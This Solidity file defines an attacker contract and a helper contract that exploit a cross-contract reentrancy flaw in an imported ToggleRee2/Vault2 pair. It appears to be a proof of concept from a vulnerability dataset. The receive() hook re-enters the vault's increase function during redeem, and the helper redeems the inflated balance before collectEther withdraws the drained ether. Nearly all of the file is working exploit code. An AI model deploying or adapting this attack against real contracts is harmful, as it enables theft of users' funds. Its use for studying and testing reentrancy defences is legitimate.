// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/access-control/feature-toggle/Toggle_ree2.sol";

// Contract ToggleRee2 contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
// Specifically, the attacker can enter the Vault contract and invoke the `increase` function
// during the execution of the `redeem` function, which pays back funds. This allows the attacker
// to manipulate the contract's state and potentially drain funds.

contract ToggleRee2Attacker {
    Vault2 public immutable vault;
    ToggleRee2 public immutable c;
    bool flag = true;
    ToggleRee2AttackerAux public aux;


    constructor(address _vault, address payable _c) {
        vault = Vault2(_vault);
        c = ToggleRee2(_c);
        aux = new ToggleRee2AttackerAux(payable(address(this)), _c);
    }

    function attack() public payable{
        (bool success,) = address(c).call{value: 1 ether}("");
        require(success);
        c.redeem(payable(address(this)));
        aux.redeem();
    }

    receive() external payable {
        vault.increase(address(aux), 2 ether);
    }

    function deposit() public payable {}

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

}

contract ToggleRee2AttackerAux {
    ToggleRee2Attacker att;
    ToggleRee2 c;

    constructor(address payable _att, address payable _c) {
        att = ToggleRee2Attacker(_att);
        c = ToggleRee2(_c);
    }

    function redeem() external {
        c.redeem(payable(address(this)));
        att.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}